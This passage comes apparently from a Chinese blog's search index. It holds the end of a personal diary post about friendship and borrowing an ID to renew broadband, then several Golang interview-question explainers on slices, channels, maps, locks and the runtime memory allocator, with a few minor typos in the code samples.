Sharp也是挺有趣的，面向对象，学过Java自然很容易掌握了。\n&emsp;&emsp;工作也不是说辛苦，就是钱少，不值，反正也是为了学习，都可以。结果22点-23点的时候吧，忽然WIFI一下子没有网络了，一打开浏览器，结果联通提示已欠费。屋漏天逢连夜雨啊。\n兄弟最后成了表面兄弟&emsp;&emsp;之前的宽带都是借一个同乡的身份证开的，因为我之前玩免流，开过太多卡，而且还没销户，很麻烦，所以只能借别人的身份证开网。我就跟这位兄弟说借身份证号码给我续费（因为他自己不需要开宽带），结果这位兄弟晾了我半天。\n他说：“你拿你的吧。“我说：“我的绑定太多卡了，开不了。”...我说：“你要是不借我的话，只能去找别人借了。”他才回复：“都可以。”\n\n&emsp;&emsp;不知道什么时候开始我们原来连表面兄弟都不是了，难道是因为我这段时间进了工作室，项目又多，经常赶项目，没去找他，也没怎么和他说话，偶尔才网聊导致的吗？认识也超过一年了，快一年半了，结果我以为能成为一个交心的兄弟变成了连表面兄弟都不愿意的联系人。\n&emsp;&emsp;虽然手机上、微信、QQ都有联系方式，但是我觉得我应该不会主动去联系他了。实际上后面的聊天记录就是我一个人在发送，如果他希望不想做表面兄弟，也不摊牌，那就这样子吧。情谊不在，恩情在。这样或者不失为一个合理的做法。一年多的相处真是谢谢了，你帮助了我很多，真心感谢你！\n不是所有的兄弟都是表面兄弟&emsp;&emsp;后面我又去找了其他人借身份证开网，但是附近的人大家都需要，找了几个人没能借到。最后还是找上了我的小可爱（淡定），二话不说就答应我了，虽然以前算是同学，但是没有什么交流，没什么印象。\n&emsp;&emsp;我很庆幸，不是所有的兄弟都是表面兄弟。还有其他的兄弟我没去找，有很多兄弟我们很久没有联系，没有见面，甚至上一次网聊都可能超过一年了，也不是说我不把你们当兄弟了。我们都还年轻，都还在拼搏。身在不同的地方， 有着各自的忙碌，如果你还把我当兄弟，当你看到这里的时候，希望你理解我无论多久没联系，当我认出你的时候，我们依旧是兄弟。\n&emsp;&emsp;身在我身边的人，不一定理解我。真正了解我的人，知道我每天花费大量的时间和精力去学习，提升自己。或许我还在网上和你嘻言，但是同时我的浏览打开十几个页面在查询资料，又或者播放器播放着学习资料。\n&emsp;&emsp;希望我的兄弟们理解我，或许我们没有机会联系，但是我会在远方祝福你！当你长久不见，发给我的第一条消息是求助时。我大概会很开心的应承下来吧。因为你困难的时候想到了我，作为兄弟我也很愿意去帮助你。\n愿我身边的、远方的兄弟身体健康，万事如意。虽然不能给你发送祝福，但是我内心的祝福不会少一分。","tags":["情感思绪"]},{"title":"Golang面试题详解（一）：数组、切片、Channel与继承","url":"/posts/59343.html","content":"Golang题库（一）golang里的数组和切片有了解过吗？值传递和引用传递在函数传参中，数组是值传递，切片则是引用传递。即函数内修改数组，外不变，而切片则相反。\n逻辑运算数组能比较大小，切片则只能与nil比较。\n容量和长度数组是连续地址的储存相同类型元素的序列，初始化容量之后，不可变。\n切片是指向数组的拥有相同类型元素的可变长序列，可以扩容和传递，比数组更加灵活。\nGo切片(slice)的实现可以在源码包src/runtime/slice.go中找到。在源码中，slice的数据结构定义如下。\ntype slice struct &#123;\tarray unsafe.Pointer\t//指向底层数组的指针\tlen int\t\t\t\t\t//切片长度\tcap int\t\t\t\t\t//切片容量&#125;\n\n容量表示能够储存的元素数量，长度表示已储存的元素数量。\n切片拷贝使用copy内置函数拷贝两个切片时，会将源切片的数据逐个拷贝到目的切片指向的数组中，拷贝数量取两个切片的最小值。\n例如长度为10的切片拷贝到长度为5的切片时，将拷贝5个元素。也就是说，拷贝过程中不会发生扩容。\ncopy函数有返回值，它返回实际上复制的元素个数，这个值就是两个slice长度的较小值。\n删除元素很遗憾，Go语言中并没有提供直接删除指定位置元素的方式。不过根据切片的性质，我们可以通过巧妙的拼接切片来达到删除指定数据的目的。\na = []int&#123;1, 2, 3&#125;//删除尾部元素a = a[:len(a) - 1]\t\t\t\t//删除尾部一个元素a = a[:len(a) - N]\t\t\t\t//删除尾部N个元素//删除头部元素a = [1:]\t\t\t\t\t\t//删除开头1个元素a = [N:]\t\t\t\t\t\t//删除开头N个元素//删除中间元素a = append(a[:i], a[i+1:]...)\t//删除中间一个元素a = append(a[:i], a[i+N:]...)\t//删除中间N个元素\n\n切片陷阱\n无法做比较\n和数组不同的是，slice无法做比较，因此不能用==来测试两个slice是否拥有相同的元素。标准库里面提供了高度优化的函数bytes.Equal来比较两个字节slice。但是对于其它类型的slice，就必须要自己写函数来比较。\nslice唯一允许的比较操作是和nil进行比较，例如\nif slice == nil &#123;/*...*/&#125;\n空切片和nil切片\n空切片和nil切片是不同的。\n\nnil切片中，切片的指针指向的是空地址，其长度和容量都为零。nil切片和nil相等。\n空切片，切片的指针指向了一个地址，但其长度和容量也为0，和nil不相等，通常用来表示一个空的集合。\n\nvar s []int\t\t\t\t// s == nilvar s = nil\t\t\t\t// s == nilvar s = []int&#123;nil&#125;\t\t\t// s == nilvar s = []int&#123;&#125;\t\t \t// s != nils := make([]int,0)  \t\t// s != nil\n使用range进行切片迭代\n当使用range进行切片迭代时，range创建了每个元素的副本，而不是直接返回对该元素的引用。如果使用该值变量的地址作为每个元素的指针，就会造成错误。\nfunc main() &#123;\ta := []int&#123;1, 2, 3, 4, 5&#125;\tfor i, v := range a &#123;\t\tfmt.Printf(&quot;Value: %d, v-addr: %X, Elem-addr: %X&quot;,v, &amp;v, &amp;a[i]) \t&#125;&#125;\n\noutput   Value: 1, v-addr: C0000AA058, Elem-addr: C0000CC030   Value: 2, v-addr: C0000AA058, Elem-addr: C0000CC038   Value: 3, v-addr: C0000AA058, Elem-addr: C0000CC040   Value: 4, v-addr: C0000AA058, Elem-addr: C0000CC048   Value: 5, v-addr: C0000AA058, Elem-addr: C0000CC050\n\n从结果中可以看出，使用range进行迭代时，v的地址是始终不变的，它并不是切片中每个变量的实际地址。而是在使用range进行遍历时，将切片中每个元素都复制到了同一个变量v中。如果错误的将v的地址当作切边元素的地址，将会引发错误。\n\n切片扩容引发的问题\n正因为有扩容机制。所以我们无法保证原始的slice和用append后的结果slice指向同一个底层数组，也无法证明它们就指向不同的底层数组。同样，我们也无法假设旧slice上对元素的操作会或者不会影响新的slice元素。所以，通常我们将append的调用结果再次赋给传入append的slice。\n内置append函数在向切片追加元素时，如果切片存储容量不足以存储新元素，则会把当前切片扩容并产生一个新的切片。\nappend函数每次追加元素都有可能触发切片扩容，即有可能返回一个新的切片，这正是append函数声明中返回值为切片的原因，使用时应该总是接收该返回值。\n建议\n使用append函数时，谨记append可能会产生新的切片，并谨慎的处理返回值。\n\nappend函数误用\n使用append函数时，需要考虑append返回的切片是否跟原切片共享底层的数组。下面这段程序片段，来看看函数返回的结果。\n//示例来源:Go专家编程func AppendDemo() &#123;\tx := make([]int, 0, 10)\tx = append(x, 1, 2, 3)\ty := append(x, 4)\tz := append(x, 5)\tfmt.Println(x)\tfmt.Println(y)\tfmt.Println(z)&#125;//output[1 2 3][1 2 3 5][1 2 3 5]\n\n题目首先创建了一个长度为0，容量为10的切片x，然后向切片x追加了1，2，3三个元素。其底层的数组结构如下图所示\n\n创建切片y为切片x追加一个元素4后，底层数组结构如下图所示\n\n需要注意的是切片x仍然没有变化，切片x中记录的长度仍为3。继续向x追加元素5后，底层数组结构如下图所示\n\n至此，答案已经非常明确了。当向x继续追加元素5后，切片y的最后一个元素被覆盖掉了。\n此时切片x仍然为[1 2 3]，而切片y和z则为[1 2 3 5]。\n建议\n一般情况下，使用append函数追加新的元素时，都会用原切片变量接收返回值来获得更新\na = append(a, elems...)\n函数传参\nGo语言中将切片作为函数参数传递会有什么神奇的现象，一起来看看下面这个示例。\npackage mainimport &quot;fmt&quot;func main()&#123;    a := []int&#123;1, 2, 3&#125;   \t\t\t//长度为3，容量为3    b := make([]int, 1, 10)     \t//长度为1，容量为10    test(a,b)\t\t\t\t   \tfmt.Println(&quot;main a =&quot;, a)    fmt.Println(&quot;main b =&quot;, b)\t\t&#125;func test(a,b []int)&#123;    a = append(a, 4)\t\t\t\t//引发扩容，此时返回的a是一个新的切片    b = append(b, 2)\t\t\t\t//没有引发扩容，仍然是原切片    a[0] = 3\t\t\t\t\t\t//改变a切片元素    b[0] = 3\t\t\t\t\t\t//改变b切片元素    fmt.Println(&quot;test a =&quot;, a)\t\t//打印函数内的a切片    fmt.Println(&quot;test b =&quot;, b)\t\t//打印函数内的b切片&#125;//outputtest a = [3 2 3 4]test b = [3 2]main a = [1 2 3]main b = [3]\n\n首先，我们创建了两个切片，a切片长度和容量均为3，b切片长度为1，容量为10。将a切片和b切片作为函数参数传入test函数中。\n在test函数中，对a切片和b切片做了如下两点改动\n\n分别使用append函数在a切片和b切片中追加一个元素\n分别对a切片和b切片的第一个元素做了修改\n\n分别在主函数中和test函数中输出两个切片，会发现在主函数中和test函数中两个切片好像改了，又好像没改，下面我们就来分析一下。\n理论分析\n当我们将一个切片作为函数参数传递给函数的时候，采用的是值传递，因此我们传递给函数的参数其实是上面这个切片三元组的值拷贝。当我们对切片结构中的指针进行值拷贝的时候，得到的指针还是指向了同一个底层数组。因此我们通过指针对底层数组的值进行修改，从而修改了切片的值。\n但是，当我们以值传递的方式传递上面的结构体的时候，同时也是传递了len和cap的值拷贝，因为这两个成员并不是指针，因此，当我们从函数返回的时候，外层切片结构体的len和cap这两个成员并没有改变。\n所以当我们传递切片给函数的时候，并且在被调函数中通过append操作向切片中增加了值，但是当函数返回的时候，我们看到的切片的值还是没有发生变化，其实底层数组的值是已经改变了的（如果没有触发扩容的话），但是由于长度len没有发生改变，所以我们看到的切片的值也没有发生改变。\n题目再分析\n有了前面的理论基础，我们再来分析一下a，b切片的返回结果。\n\na切片作为参数传至test函数中，在test中向a切片追加一个元素后，此时触发扩容机制，返回的切片已经不再是原切片，而是一个新的切片。后续对a切片中的第一个元素进行修改也是对新切片进行修改，对老切片不会产生任何影响。\n所以，最终在主函数中a切片仍然为[1 2 3]，而在test函数中a切片变成了[3 2 3 4]。\n\nb切片作为参数传至test函数中，在test中向b切片追加一个元素后，不会触发扩容机制，返回的仍然是原切片，所以在后续对b切片的修改都是在原切片中进行的修改。故在test函数中b切片为[3 2]。但是在主函数中确为[3]，可以看出在test中对切片进行修改确实反应到主函数中了，但是由于其len和cap没有改变，len仍为1，所以最终就只输出切片中的第一个元素[3]，但其底层数组的值其实已经改变了。\n\n\n\n\n扩容\nGo 语言中的数据和 C语言中的类似, 是一片连续的内存空间, 申请时需指定长度, 不能按需扩容\n切片实际上是对数组的引用, 使用 make()函数创建,也可以直接赋值使用, 可以按需扩容, 一次扩容的量为caps 的两倍(&lt;=1.17版本为len小于1024 时, 扩容为caps的两倍, len大于1024时, 会形成一个循环, 每次扩容caps的25%,知道满足容量需求. Go1.18 改变了这个机制)\n\nGo1.18不再以1024为临界点，而是设定了一个值为256的threshold，以256为临界点；超过256，不再是每次扩容1/4，而是每次增加（旧容量+3256）/4；■ 当新切片需要的容量cap大于两倍扩容的容量，则直接按照新切片需要的容量扩容；■ 当原 slice 容量 &lt; threshold 的时候，新 slice 容量变成原来的 2 倍；■ 当原 slice 容量 &gt; threshold，进入一个循环，每次容量增加（旧容量+3threshold）/4。\n\n\n\n需要注意切片是对数组的引用, 所以当切片被赋值给别的切片变量时, 改变新的切片变量中的值, 会连带改变原切片值\n\n对已经关闭的channel进行读写操作会发生什么?读\n读已经关闭的channel无影响。\n如果在关闭前，通道内部有元素，会正确读到元素的值；如果关闭前通道无元素，则会读取到通道内元素类型对应的零值。\n若遍历通道，如果通道未关闭，读完元素后，会报死锁的错误。\n\nfatal error: all goroutines are asleep - deadlock!\n\n写\n写已关闭的通道\n\n/*[Output]: panic: send on closed channel*/\n\n\n关闭已关闭的通道\n\n/*[Output]: panic: close of closed channel */\n\nGo语言中是如何实现继承的?Go与C++、Java这样的面向对象语言不同，使用另外一种方式实现类似继承的效果。Go的method能够指定接收者，它可以是一种结构体，并且它可以是任意类型。\n结构体嵌套在Go语言中，可以通过结构体组合来实现继承，示例如下：\n// 这里Student继承了People，具有People的属性type People struct &#123;    Name string&#125;type Student struct&#123;    People    Grade int&#125;\n\n与继承不一样的是，结构体能够通过组合选择所需要继承的方法。\n\n\n接口封装Go 中的接口是一个抽象类型，描述了对象可以接受的行为。通过实现接口，可以让不同的类型拥有相同的方法，从而实现多态性。接口与继承类似，但是接口是基于行为的而不是基于类型的。因此，通过接口实现的多态性可以更加灵活和动态。\n","categories":["Golang","面试题"],"tags":["Golang","Go面试题","数组","切片","Channel","继承"]},{"title":"Golang面试题详解（三）：Channel与锁、应用场景及Slice与Array深度对比","url":"/posts/31692.html","content":"Golang题库（三）同一个协程里面，对无缓冲channel同时发送和接收数据有什么问题 同一个协程里，不能对无缓冲channel同时发送和接收数据，如果这么做会直接报错死锁。\n对于一个无缓冲的channel而言，只有不同的协程之间一方发送数据一方接受数据才不会阻塞。channel无缓冲时，发送阻塞直到数据被接收，接收阻塞直到读到数据。\nchannel和锁的对比作用区别\nChannel是用于处理协程中的数据通信问题的，通过编程逻辑设计，可以实现锁的效果。\nMutex是用于控制原子性操作数据安全性，通过加锁和释放确保区间内数据只能有单一协程访问。数据一致性。\n\n两者的用途不同\n两者内存占用也不同\n\n\nchannel的应用场景channel用于协程之间数据通信，根据设计能够实现多种功能。\n\n\n任务超时与取消通过在通道中传递信号，可以实现任务的超时和取消机制。例如，一个 goroutine 可以在执行耗时操作时启动一个定时器，如果操作在指定时间内未完成，可以通过通道发送取消信号给其他 goroutine，从而取消操作。\n比如超时处理：\nselect &#123;    case &lt;-time.After(time.Second):\n\n定时任务\nselect &#123;    case &lt;- time.Tick(time.Second)\n\n事件发布与订阅（事件驱动编程）通道可以用作发布者和订阅者之间的消息传递机制。发布者将事件发送到通道，订阅者从通道接收事件并进行相应的处理。这种模式可以用于实现观察者模式或消息队列等场景。\n控制并发数通道可以用于限制并发任务的数量，控制并发度。通过创建有缓冲的通道，可以限制通道中可以放入的元素数量，从而控制并发任务的数量。例如控制并发为5个协程：\nch := make(chan int, 5)for _, url := range urls &#123;    go func() &#123;        ch &lt;- 1        worker(url)        &lt;- ch    &#125;&#125;\n\n数据流处理通道在处理数据流时非常有用。一个 goroutine 可以负责生成数据，并将数据发送到通道中，而另一个或多个 goroutine 可以从通道中接收数据并进行处理，实现数据的流动和处理。\n并发任务的协调通道可以用于在不同的 goroutine 之间传递数据，实现并发任务的协调和通信。例如，一个主 goroutine 可以将任务分发给多个工作 goroutine，通过通道发送任务并接收结果。\n多个 goroutine 的结果汇总当有多个 goroutine 并行执行任务时，可以使用通道将它们的结果汇总。每个 goroutine 将结果发送到通道，然后另一个 goroutine 从通道中接收并处理这些结果。\n线程安全的数据传递与共享通道提供了一种线程安全的数据传递方式，避免了显式的锁操作。多个 goroutine 可以通过通道进行数据传递和共享，保证数据访问的原子性和一致性。\nslice和array区别在Go语言中，Slice（切片）和Array（数组）是两种不同的数据类型，它们之间有以下区别：\n\n大小固定 vs. 大小可变：数组的长度是固定的，在声明时就需要指定其长度，并且长度不可变。而切片的长度是可变的，可以根据需要进行动态扩容或缩减。\n值传递 vs. 引用传递：数组在赋值或传递给函数时是按值传递的，即会复制整个数组的内容。切片则是引用传递的，赋值或传递切片时只会复制切片的指针、长度和容量，并不会复制底层数据。\n内存分配方式：数组在声明时会直接在内存中分配连续的空间来存储元素，因此数组的内存布局是连续的。切片则是建立在数组之上的动态数据结构，底层依赖于数组，并且可以自动进行内存扩容。\n初始化方式：数组可以使用字面量或初始化表达式进行初始化，需要指定固定长度。切片可以通过使用字面量或通过 make() 函数进行初始化，并且可以根据需要动态改变长度。\n传递性：数组作为函数参数传递时，会进行一次完整的复制，传递的是数组的副本。而切片作为函数参数传递时，只是传递了指向底层数组的指针、长度和容量，不会进行复制。\n长度信息：数组的长度是固定的，可以通过 len() 函数获取数组的长度。切片则可以使用 len() 函数获取当前切片的长度，可以通过 cap() 函数获取切片的容量。\n\n总的来说，数组适用于固定长度且不需要频繁扩容的情况，而切片则更加灵活，适用于需要动态改变长度或进行大量操作的场景。在实际开发中，切片更常用，因为它提供了更多的便利和功能，而数组则更适合特定需求的场景。\n","categories":["Golang","面试题","并发编程"],"tags":["Golang","Go面试题","Channel","Mutex","锁","并发控制","Slice","Array"]},{"title":"Golang面试题详解（七）：Slice底层、线程安全Map、锁与Map实现","url":"/posts/41935.html","content":"Golang题库（七）Slice 与 Array, Append()Array数组（Array）是一个由固定长度的特定类型元素组成的序列，一个数组可以由零个或多个元素组成。因其长度的不可变动，数组在Go中很少直接使用。把一个大数组传递给函数会消耗很多内存。一般采用数组的切片\n几种初始化方式\narr1 := [3]int&#123;1, 2, 3&#125;arr2 := [...]int&#123;1, 2, 3&#125;arr3 := [3]int&#123;0:3,1:4&#125;\n\nSliceSlice是一种数据结构，描述与Slice变量本身分开存储的Array的连续部分。 Slice不是Array。Slice描述了Array的一部分。\nslice底层是一个struct\n// runtime/slice.gotype slice struct &#123;    array unsafe.Pointer// 指向数组的指针    len   int    cap   int&#125;\n\n创建slice的几种方法\n// 直接通过make创建，可以指定len、caps4 := make([]int, 5, 10)// 通过数组/slice 切片生成var data [10]ints2 := data[2:8]s3 := s2[1:3]// append()s6 = append(s4,6)// 直接创建s1 := []int&#123;1, 2&#125;\n\nappend() 底层逻辑\n计算追加后slice的总长度n\n如果总长度n大于原cap，则调用growslice func进行扩容（cap最小为n，具体扩容规则见growslice）\n对扩容后的slice进行切片，长度为n，获取slice s，用以存储所有的数据\n根据不同的数据类型，调用对应的复制方法，将原slice及追加的slice的数据复制到新的slice\n\ngrowslice 计算cap的逻辑\n原cap扩容一倍，即doublecap\n如果指定cap大于doublecap则使用cap，否则执行如下\n如果原数据长度小于1024，则使用doublecap\n否则在原cap的基础上每次扩容1/4，直至不小于cap\n\n如何实现一个线程安全的 map?三种方式实现：\n加读写锁\n分片加锁\nsync.Map\n\n加读写锁、分片加锁，这两种方案都比较常用，后者的性能更好，因为它可以降低锁的粒度，提高访问此 map 对象的吞吐。前者并发性能虽然不如后者，但是加锁的方式更加简单。sync.Map 是 Go 1.9 增加的一个线程安全的 map ，虽然是官方标准，但反而是不常用的，原因是 map 要解决的场景很难\n描述，很多时候程序员在做抉择是否该用它，不过在一些特殊场景会使用 sync.Map，\n场景一：只会增长的缓存系统，一个 key 值写入一次而被读很多次；\n场景二：多个 goroutine 为不相交的键读、写和重写键值对。对它的使用场景介绍，来自官方文档，这里就不展开了。加读写锁，扩展 map 来实现线程安全，支持并发读写。使用读写锁 RWMutex，是为了读写性能的考虑。对 map 对象的操作，无非就是常见的增删改查和遍历。我们可以将查询和遍历看作读操作，增加、修改和删除看作写操作。示例代码链接：https://github.com/guowei-gong/go-demo/blob/main/mutex/demo.go。通过读写锁提供线程安全的 map，但是大量并发读写的情况下，锁的竞争会很激烈，导致性能降低。如何解决这个问题？尽量减少锁的粒度和锁的持有时间，减少锁的粒度，常用方法就是分片 Shard，将一把锁分成几把锁，每个锁控制一个分片。\n⭐go 的锁是可重入的吗？不是可重入锁。讨论这个问题前，先解释一下”重入”这个概念。当一个线程获取到锁时，如果没有其他线程拥有这个锁，那么这个线程就会成功获取到这个锁。线程持有这个锁后，其他线程再请求这个锁，其他线程就会进入阻塞等待的状态。\n但是如果拥有这个锁的线程再请求这把锁的话，就不会阻塞，而是成功返回，这就是可重入锁。可重入锁也叫做递归锁。为什么 go 的锁不是可重入锁，因为 Mutex 的实现中，没有记录哪个 goroutine 拥有这把锁。换句话说，我们可以通过扩展来将 go 的锁变为可重入锁，这里就不展开了。下面是一个误用 Mutex 的重入例子：https://github.com/guowei-gong/go-demo/commit/a6fc236853f5cd0efd4e62269cfe60a19de7a96e\n⭐Go map 的底层实现 ？Go语言的map使用Hash表和搜索树作为底层实现，一个Hash表可以有多个bucket，而每个bucket保存了map中的一个或一组键值对。\n源码：runtime/map.go:hmap\n// go 1.17type hmap struct &#123;    count      int            //元素个数，调用len(map)时直接返回    flags      uint8          //标志map当前状态,正在删除元素、添加元素.....    B          uint8          //单元(buckets)的对数 B=5表示能容纳32个元素    noverflow  uint16        //单元(buckets)溢出数量，如果一个单元能存8个key，此时存储了9个，溢出了，就需要再增加一个单元    hash0      uint32         //哈希种子    buckets    unsafe.Pointer //指向单元(buckets)数组,大小为2^B，可以为nil    oldbuckets unsafe.Pointer //扩容的时候，buckets长度会是oldbuckets的两倍    nevacute   uintptr        //指示扩容进度，小于此buckets迁移完成    extra      *mapextra      //与gc相关 可选字段&#125;\n\n下图展示了一个拥有4个bucket的map。\n\n本例中，hmap.B=2，hmap.buckets数组的长度是4 (2B)。元素经过Hash运算后会落到某个bucket中进行存储。\nbucket的数据结构\n数据结构源码：runtime/map.go/bmap\n// A bucket for a Go map.type bmap struct &#123;\ttophash [bucketCnt]uint8&#125;//实际上编译期间会生成一个新的数据结构type bmap struct &#123;    topbits  [8]uint8    keys     [8]keytype    values   [8]valuetype    pad      uintptr    overflow uintptr&#125;\n\nbmp也就是bucket，由初始化的结构体可知，里面最多存8个key，每个key落在桶的位置有hash出来的结果的高8位决定。\n其中tophash是一个长度为8的整型数组，Hash值相同的键存入当前bucket时会将Hash值的高位存储在该数组中，以便后续匹配。\n整体图如下\n\n有一点需要注意：当map的key和value都不是指针，并且size都小于 128 字节的情况下，会把 bmap标记为不含指针，这样可以避免gc时扫描整个hmap。尽管如此，但如图所示，bmap是有一个overflow的字段，该字段是指针类型，这就破坏了bmap不含指针的设想，这时会把overflow\n","categories":["Golang","面试题","数据结构","并发编程"],"tags":["Golang","Go面试题","Mutex","Slice","Array","append","sync.Map","线程安全","可重入锁","Map","hmap"]},{"title":"Golang面试题详解（九）：内存模型、深浅拷贝与并发安全","url":"/posts/19444.html","content":"Golang题库（九）怎么用go实现一个栈//一个队列type MyStack struct &#123;    queue []int&#125;func Constructor() MyStack &#123;    return MyStack&#123;        queue: make([]int, 0),     &#125;&#125;func (this *MyStack) Push(x int)  &#123;    this.queue = append(this.queue, x)&#125;func (this *MyStack) Pop() int &#123;//出队操作    n := len(this.queue)-1     for n!=0&#123; ////除了最后一个，其余的都重新添加到队列里        val := this.queue[0]        this.queue = this.queue[1:]        this.queue = append(this.queue, val)        n--    &#125;//新入队元素x到了最前面，出队时直接出-》后入先出    val := this.queue[0]    this.queue = this.queue[1:]    return val&#125;func (this *MyStack) Top() int &#123;    val := this.Pop()    this.queue = append(this.queue, val)    return val&#125;func (this *MyStack) Empty() bool &#123;    if len(this.queue)==0&#123;        return true    &#125;    return false&#125;\n\n问了一些Golang的基本知识，如slice用copy和左值进行初始化的区别\ncopy(slice2, slice1)实现的是深拷贝。拷贝的是数据本身，创造一个新对象，新创建的对象与原对象不共享内存，新创建的对象在内存中开辟一个新的内存地址，新对象值修改时不会影响原对象值。同样的还有：遍历slice进行append赋值\n如slice2 := slice1实现的是浅拷贝。拷贝的是数据地址，只复制指向的对象的指针，此时新对象和老对象指向的内存地址是一样的，新对象值修改时老对象也会变化。默认赋值操作就是浅拷贝。\n\nchannel是否线程安全等\nchannel为什么设计成线程安全?不同协程通过channel进行通信，本身的使用场景就是多线程，为了保证数据的一致性，必须实现线程安全。\nchannel如何实现线程安全的?channel的底层实现中， hchan结构体中采用Mutex锁来保证数据读写安全。在对循环数组buf中的数据进行入队和出队操作时，必须先获取互斥锁，才能操作channel数据。\n\ngo的map是线程安全的吗？不是\nsync.map 才是线程安全的。\nGo语言Slice是否线程安全不是\nGo语言实现线程安全常用的几种方式:\n\n互斥锁；\n读写锁；\n原子操作；\nsync.once；\nsync.atomic；\nchannel\n\nslice底层结构并没有使用加锁等方式，不支持并发读写，所以并不是线程安全的，使用多个goroutine对类型为slice的变量进行操作，每次输出的值大概率都不会一样，与预期值不一致; slice在并发执行中不会报错，但是数据会丢失。\nmake可以初始化哪些结构\nslice\nmap\nchannel\n\nnew和make对比\nmake 只能用来分配及初始化类型为 slice、map、chan 的数据。new 可以分配任意类型的数据；\nnew 分配返回的是指针，即类型 *Type。make 返回引用，即 Type；\nnew 分配的空间被清零。make 分配空间后，会进行初始化；\nmake 函数只用于 map，slice 和 channel，并且不返回指针\n\n内存模型Go语言运行时依靠细微的对象切割、极致的多级缓存、精准的位图管理实现了对内存的精细化管理。\n\n 将对象分为微小对象、小对象、大对象，使用三级管理结构mcache、mcentral、mheap用于管理、缓存加速span对象的访问和分配，使用精准的位图管理已分配的和未分配的对象及对象的大小。​ Go语言运行时依靠细微的对象切割、极致的多级缓存、精准的位图管理实现了对内存的精细化管理以及快速的内存访问，同时减少了内存的碎片。\nSpan\nGo 将内存分成了67个级别的scan，特殊的0级特殊大对象大小是不固定的。\n\n当具体的对象需要分配内存时，并不是直接分配span，而是分配不同级别的span中的元素。因此span的级别不是以每个span的大小为依据，而是以span中元素的大小为依据的。\n\n\n\nSpan等级\n元素大小(字节)\nSpan大小(字节)\n元素个数\n\n\n\n1\n8\n8192\n1024\n\n\n2\n16\n8192\n512\n\n\n3\n32\n8192\n256\n\n\n4\n48\n8192\n170\n\n\n65\n64\n8192\n128\n\n\n…\n…\n…\n…\n\n\n65\n28672\n57344\n2\n\n\n66\n32768\n32768\n1\n\n\n第1级span拥有的元素个数为8192/8=1024。每个span的大小和span中元素的个数都不是固定的，例如第65级span的大小为57344字节，每个元素的大小为28672字节，元素个数为2。span的大小虽然不固定，但其是8KB或更大的连续内存区域。每个具体的对象在分配时都需要对齐到指定的大小，假如我们分配17字节的对象，会对应分配到比17字节大并最接近它的元素级别，即第3级，这导致最终分配了32字节。因此，这种分配方式会不可避免地带来内存的浪费。\n三级对象管理\n为了方便对Span进行管理，加速Span对象访问、分配。分别为mcache、mcentral、mheap。TCMalloc内存分配算法的思想:每个逻辑处理器P都存储了一个本地span缓存，称作mcache。如果协程需要内存可以直接从mcache中获取，由于在同一时间只有一个协程运行在逻辑处理器P上，所以中间不需要加锁。mcache包含所有大小规格的mspan，但是每种规格大小只包含一个。除class0外，mcache的span都来自mcentral。\nmcentral 所有逻辑处理器P共享的。\n\n对象收集所有给定规格大小的span。每个mcentral都包含两个mspan的链表：empty mspanList表示没有空闲对象或span已经被mcache缓存的span链表，nonempty mspanList表示有空闲对象的span链表。(为了的分配Mspan到Mcache中)\nmheap 每个级别的span都会有一个mcentral用于管理span链表（0级除外），其实 都是一个数组，由Mheap管理作用：不只是管理central，大对象也会直接通过mheap进行分配。\n\nmheap实现了对虚拟内存线性地址空间的精准管理，建立了span与具体线性地址空间的联系，保存了分配的位图信息，是管理内存的最核心单元。堆区的内存被分成了HeapArea大小进行管理。对Heap进行的操作必须全局加锁，而mcache、mcentral可以被看作某种形式的缓存。\n\n\n（三级缓存对象图）\n\n（mheap管理虚拟内存线性地址空间）\n\n四级内存块管理\nGo 根据对象大小，将堆内存分成了 HeapArea-&gt;chunk-&gt;span-&gt;page 4种内存块进行管理。不同的内存块用于不同的场景，便于高效地对内存进行管理。\n\nHeapArea 内存块最大，其大小与平台相关，在UNIX 64位操作系统中占据64MB。\nchunk占据了512KB\nspan根据级别大小的不同而不同，但必须是page的倍数\n而1个page占据8KB\n\n（内存块管理结构）\n\n对象分配\n在运行时分配对象的逻辑主要位于mallocgc函数中，这个名字很有意思，malloc代表分配，gc代表垃圾回收（GC），此函数除了分配内存还会为垃圾回收做一些位图标记工作。内存分配时，将对象按照大小不同划分为微小（tiny）对象、小对象、大对象。微小对象的分配流程最长，逻辑链路最复杂\n\n微小对象\n小于16字节的都被划分成了微小对象，微小对象主要处理极小的字符串和独立的转义变量。\n\n微小对象会被放入class为2的span中，首先对微小对象按照2、4、8的规则进行字节对齐。例如，字节为1的元素会被分配2字节，字节为7的元素会被分配8字节。\n微小对象分配时，查看之前分配的元素中是否有空余的空间，如果当前对象要分配8字节，并且正在分配的元素可以容纳8字节，则返回tiny+offset的地址，分配完成后offset的位置也需要相应增加，为下一次分配做准备。\n如果当前要分配的元素空间不够，将尝试从mcache中查找span中下一个可用的元素。因此，tiny分配的第一步是尝试利用分配过的前一个元素的空间，达到节约内存的目的。\n（微小对象分配）\n\ntiny offset代表当前已分配内存的偏移量）\n\nMcache 缓存位图\n在查找空闲元素空间时，首先需要从mcache中找到对应级别的mspan，mspan中拥有allocCache字段，其作为一个位图，用于标记span中的元素是否被分配。由于allocCache元素为uint64，因此其最多一次缓存64字节。\n\n有时候，span中元素的个数大于64，因此需要专门有一个字段freeindex标识当前span中的元素被分配到了哪里。span中小于freeindex序号的元素都已经被分配了，将从freeindex开始继续分配。因此，只要从allocCache开始找到哪一位为0即可。假如X位为0，那么X+freeindex为当前span中可用的元素序号。当allocCache中的bit位全部被标记为1后，需要移动freeindex，并更新allocCache，一直到span中元素的末尾为止。\n（allocCache位图标记span中的元素是否被分配）\n\n（freeindex之前的元素都已被分配）\n\nmcentral 遍历 span\n如果当前的span中没有可以使用的元素，这时就需要从mcentral中加锁查找。mcentral中有两种类型的span链表，分别是有空闲元素的nonempty链表和没有空闲元素的empty链表。在mcentral查找时，会分别遍历这两个链表，查找是否有可用的span。\n\n既然是没有空闲元素的empty链表，为什么还需要遍历呢？\n这是由于可能有些span虽然被垃圾回收器标记为空闲了，但是还没有来得及清\n\nMheap 缓存查找\n如果在mcentral中找不到可以使用的span，就需要在mheap中查找。Go 1.12 采用treap结构进行内存管理，treap是一种引入了随机数的二叉搜索树，其实现简单，引入的随机数及必要时的旋转保证了比较好的平衡性。这种方式有扩展性的问题，由于这棵树是mheap管理的，所以在操作它时需要维持一个lock。这在密集的对象分配及逻辑处理器P过多时，会导致更长的等待时间。使用bitmap来管理内存页，我们会看到每个逻辑处理器P中都维护了一份page cache，这就是现在Go实现的方式。  mheap会首先查找每个逻辑处理器P中pageCache字段的cache。cache也是一个位图，每一位都代表了一个page（8 